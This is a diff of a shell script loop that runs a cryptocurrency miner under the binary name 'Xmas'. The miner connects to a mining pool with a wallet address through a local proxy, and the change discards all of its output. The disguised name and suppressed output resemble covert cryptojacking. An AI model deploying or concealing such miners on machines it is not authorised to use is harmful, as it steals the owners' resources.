@@ -101,6 +101,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o new.yadaminers.pl:5555 -u 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate --rig-id=$currentdate -p $currentdate -a rx/yada -k --randomx-1gb-pages --proxy=127.0.0.1:1081 -t $used_num_of_cores
+./Xmas --donate-level 1 -o new.yadaminers.pl:5555 -u 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate --rig-id=$currentdate -p $currentdate -a rx/yada -k --randomx-1gb-pages --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
